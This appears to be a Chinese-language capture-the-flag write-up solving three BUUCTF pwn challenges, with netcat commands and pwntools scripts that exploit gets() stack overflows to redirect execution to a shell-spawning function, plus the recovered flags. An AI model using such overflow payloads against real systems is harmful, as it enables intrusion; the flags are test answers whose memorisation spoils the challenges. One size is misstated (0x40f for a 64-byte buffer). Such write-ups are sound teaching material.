# BUUCTF

## Pwn

### [test_your_nc](https://buuoj.cn/challenges#test_your_nc)

这题亏我还先`file ./test`查看文件类型和`checksec --file=test`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/test_your_nc/1.png)

结果输入以下代码就能拿到`flag{24c4fb91-44b7-4a4f-8f30-895875efacd7}`。

```bash
nc node4.buuoj.cn 27841 #使用nc连接node4.buuoj.cn的监听端口27841
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

------

### [rip](https://buuoj.cn/challenges#rip)

先`file ./test`查看文件类型和`checksec --file=test`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/rip/1.png)

用`IDA Pro 64bit`打开`pwn1`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`s`中，`s`的长度只有`0xf`，即可用栈大小只有`15`字节，但是`gets()`并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/rip/2.png)

在`Functions window`可以看到有一个`fun()`函数：

![](https://paper.tanyaodan.com/BUUCTF/rip/3.png)

按`F5`反汇编可以看到这是一个系统调用，且`fun()`函数的起始地址为`0x401186`。

![](https://paper.tanyaodan.com/BUUCTF/rip/4.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`28531`，并发送`payload`：

```python
from pwn import *
# remote()建立远程连接,指明ip和port
io = remote('node4.buuoj.cn', 28531)
payload = b'a'*(0xf + 0x8) + p64(0x40118A)
io.sendline(payload) #发送数据
io.interactive() #与shell进行交互
```

与`shell`交互时输入以下命令行即可得到`flag{c706d420-68bf-4b75-9468-97997d4817b6}`。

```bash
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

![](https://paper.tanyaodan.com/BUUCTF/rip/5.png)

------

### [warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)

先`file ./test`查看文件类型和`checksec --file=test`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/1.png)

用`IDA Pro 64bit`打开`warmup_csaw_2016`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v5`中，`v5`的长度只有`0x40f`，即可用栈大小只有`64`字节，但是`gets()`并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/2.png)

在`Functions window`可以看到有一个`sub_40060D()`函数，按`F5`反汇编可以看到这是一个系统调用，且`sub_40060D()`函数的起始地址为`0x40060D`。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/3.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25282`，发送`payload`即可得到`flag{31eb59d1-1c21-4440-96a5-b12276f75a41}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25282)
payload = b'a'*(0x40 + 0x8) + p64(0x40060D)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/4.png)

------

### 